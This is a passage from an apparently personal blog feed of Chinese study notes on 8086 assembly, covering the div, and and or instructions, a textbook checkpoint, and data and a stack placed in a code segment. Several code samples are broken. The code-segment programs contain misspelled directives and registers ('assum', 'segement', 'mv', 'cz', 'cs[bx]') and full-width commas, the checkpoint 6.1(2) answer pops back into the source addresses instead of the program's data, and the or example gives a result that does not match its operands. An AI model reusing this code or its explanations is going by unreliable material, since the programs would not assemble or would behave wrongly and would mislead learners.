class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dx,1</span><br><span class="line">mov ax,86A1H      ;(dx)*10000H+(ax)=100001</span><br><span class="line">mov bx,100</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure></p><p>程序执行后（ax）=03E8H（即1000）（dx）=1（余数为1）</p><p>4、用除法指令计算1001/100<br>分析：被除数1001可用ax寄存器存放，除数100可用8位寄存器存放，也就是说，要进行8位的除法。程序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1001</span><br><span class="line">mov bl,100</span><br><span class="line">div bl</span><br></pre></td></tr></table></figure></p><p>程序执行后，（al）=0AH（即10），（ah）=1（余数为1）</p><p>5、<img src="https://i.imgur.com/YtUX3E3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;div是除法指令，使用div做除法时应注意以下问题。&lt;/p&gt;
&lt;p&gt;1、除数：有8位和16位两种，在一个reg或内存单元中。&lt;br&gt;2、被除数：默认放在AX或DX和AX中，如果除数位8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>and和or指令</title>
    <link href="http://yoursite.com/2018/09/11/and%E5%92%8Cor%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/09/11/and和or指令/</id>
    <published>2018-09-11T11:05:02.000Z</published>
    <updated>2018-09-11T11:27:07.440Z</updated>
    
    <content type="html"><![CDATA[<p>1、and指令：逻辑与指令，按位进行与运算<br>通过该指令可将操作对象位设为0，其他为不变</p><p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br></pre></td></tr></table></figure></p><p>执行后al=00100011B</p><p>2、or指令：逻辑或指令，按位进行或运算。<br>通过该指令可将操作对象位设为1，其他位不变</p><p>例如指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,0110001B</span><br><span class="line">or al,00111011B</span><br></pre></td></tr></table></figure><p>执行后：al=01111011B</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、and指令：逻辑与指令，按位进行与运算&lt;br&gt;通过该指令可将操作对象位设为0，其他为不变&lt;/p&gt;
&lt;p&gt;例如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>检测点6.1</title>
    <link href="http://yoursite.com/2018/09/10/%E6%A3%80%E6%B5%8B%E7%82%B96-1/"/>
    <id>http://yoursite.com/2018/09/10/检测点6-1/</id>
    <published>2018-09-10T13:01:50.000Z</published>
    <updated>2018-09-10T13:16:23.212Z</updated>
    
    <content type="html"><![CDATA[<p>知识点：1.用于显式地指明内存单元的段地址的”ds:” “cs:” “ss:” “es:” 在汇编语言中称为段前缀</p><p>2.Dos方式下，一般情况，0:200 - 0:2ff空间中没有系统或其他程序的数据或代码。</p><p>检测点：(1)下面的程序实现依次用内存0:0 - 0:15单元中的内容改写程序中的数据，完成程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">start: mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s: mov ax,[bx]</span><br><span class="line">mov cs:[bx],ax</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>(2)下面的程序实现依次用内存0:0 - 0:15单元中的内容改写程序中的数据，数据的传送用栈来进行。栈空间设置栈程序中。完成程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0</span><br><span class="line"></span><br><span class="line">start: mov ax,cs</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,24h</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s: push [bx]</span><br><span class="line">pop [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;知识点：1.用于显式地指明内存单元的段地址的”ds:” “cs:” “ss:” “es:” 在汇编语言中称为段前缀&lt;/p&gt;
&lt;p&gt;2.Dos方式下，一般情况，0:200 - 0:2ff空间中没有系统或其他程序的数据或代码。&lt;/p&gt;
&lt;p&gt;检测点：(1)下面的程序实现依次用内
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>在代码段中使用栈</title>
    <link href="http://yoursite.com/2018/09/10/%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%A0%88/"/>
    <id>http://yoursite.com/2018/09/10/在代码段中使用栈/</id>
    <published>2018-09-10T12:14:07.000Z</published>
    <updated>2018-09-10T13:01:16.912Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">assum cs:codesg</span><br><span class="line">code segement</span><br><span class="line"></span><br><span class="line">dw 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0    ;用dw定义16个字型数据，在程序加载后，将取得</span><br><span class="line">                                          16个字的内存空间，存放着6个数据。在后面的程</span><br><span class="line">                                          序中将这段空间当作栈来使用</span><br><span class="line">start: mov ax,cs</span><br><span class="line">   mov ss,ax</span><br><span class="line">   mv sp,30h                         ;设置栈顶ss：sp指向CS：30</span><br><span class="line"></span><br><span class="line">       mov bx,0</span><br><span class="line">   mov cz,8</span><br><span class="line"></span><br><span class="line">   s: push cs:[bx]</span><br><span class="line">   add bx,2</span><br><span class="line">   loop s</span><br><span class="line"></span><br><span class="line">   s0: pop cs[bx]</span><br><span class="line">   add bx,2</span><br><span class="line">   loop s0                          ;将定义的数据逆序存放</span><br><span class="line"></span><br><span class="line">   mov ax,4c00h</span><br><span class="line">   int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>在代码段中使用数据</title>
    <link href="http://yoursite.com/2018/09/10/%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE/"/>
    <id>http://yoursite.com/2018/09/10/在代码段中使用数据/</id>
    <published>2018-09-10T12:13:37.000Z</published>
    <updated>2018-09-10T13:16:45.559Z</updated>
    
    <content type="html"><![CDATA[<p>编程计算以下8个数据的和，结果存在ax寄存器中：</p><p>0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assum cs:code </span><br><span class="line">code segement</span><br><span class="line"></span><br><span class="line">dw 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H</span><br><span class="line">mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line">mov cz,8</span><br><span class="line">s: add ax,cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p><p>dw的含义是定义字型数据，dw即“define word”，在这里，使用dw定义了8个字型数据，它们所占的内存空间的大小为16个字节。<br>程序在运行的时候cs中存放代码段的段地址，所以可以从cs中得到它们的段地址</p><p>因为用dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是CS：0、CS：2、CS：4、CS：6、CS：8、CS：A、CS：C、CS：E。<br>用bx存放加2递增的偏移地址用循环来进行累加。在循环开始前,设置（bx）=0，CS：BX指向第一个数据存放的字单元。每次循环中（bx）=（bx）+2，CS：BX指向下一个数据所在的字单元。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;编程计算以下8个数据的和，结果存在ax寄存器中：&lt;/p&gt;
&lt;p&gt;0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;
      
    
    </summary>
    
    
  </entry>
  
</feed>
